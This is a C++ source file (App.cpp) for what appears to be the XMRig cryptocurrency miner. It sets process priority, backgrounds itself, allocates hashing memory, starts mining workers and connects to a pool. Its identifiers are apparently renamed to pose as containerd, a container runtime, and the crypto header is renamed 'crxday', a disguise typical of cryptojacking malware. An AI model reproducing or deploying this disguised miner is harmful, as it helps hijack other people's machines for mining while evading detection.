#include <stdlib.h>
#include <uv.h>


#include "api/Api.h"
#include "App.h"
#include "Console.h"
#include "Cpu.h"
#include "crxx/crxday.h"
#include "Mem.h"
#include "net/Network.h"
#include "Options.h"
#include "Platform.h"
#include "version.h"
#include "workers/Workers.h"

#ifndef containerd_NO_HTTPD
#   include "api/Httpd.h"
#endif


App *App::m_self = nullptr;



App::App(int argc, char **argv) :
    m_console(nullptr),
    m_httpd(nullptr),
    m_network(nullptr),
    m_options(nullptr)
{
    m_self = this;

    Cpu::init();
    m_options = Options::parse(argc, argv);
    if (!m_options) {
        return;
    }

    Platform::init(m_options->userAgent());
    Platform::setProcessPriority(m_options->priority());

    m_network = new Network(m_options);

    uv_signal_init(uv_default_loop(), &m_sigHUP);
    uv_signal_init(uv_default_loop(), &m_sigINT);
    uv_signal_init(uv_default_loop(), &m_sigTERM);
}


App::~App()
{
    uv_tty_reset_mode();

#   ifndef containerd_NO_HTTPD
    delete m_httpd;
#   endif

    delete m_console;
}


int App::exec()
{
    if (!m_options) {
        return 2;
    }

    uv_signal_start(&m_sigHUP,  App::onSignal, SIGHUP);
    uv_signal_start(&m_sigINT,  App::onSignal, SIGINT);
    uv_signal_start(&m_sigTERM, App::onSignal, SIGTERM);

    background();

    if (!crxday::init(m_options->algo(), m_options->algoVariant())) {
        return 1;
    }

    Mem::allocate(m_options->algo(), m_options->threads(), m_options->doublehxsh(), m_options->hugePages());

    if (m_options->dryRun()) {
        release();

        return 0;
    }

#   ifndef containerd_NO_API
    Api::start();
#   endif

#   ifndef containerd_NO_HTTPD
    m_httpd = new Httpd(m_options->apiPort(), m_options->apiToken());
    m_httpd->start();
#   endif

    Workers::start(m_options->affinity(), m_options->priority());

    m_network->connect();

    const int r = uv_run(uv_default_loop(), UV_RUN_DEFAULT);
    uv_loop_close(uv_default_loop());

    release();
    return r;
}


void App::close()
{
    m_network->stop();
    Workers::stop();

    uv_stop(uv_default_loop());
}


void App::release()
{
    if (m_network) {
        delete m_network;
    }

    Options::release();
    Mem::release();
    Platform::release();
}


void App::onSignal(uv_signal_t *handle, int signum)
{
    switch (signum)
    {
    case SIGHUP:
        break;

    case SIGTERM:
        break;

    case SIGINT:
        break;

    default:
        break;
    }

    uv_signal_stop(handle);
    m_self->close();
}
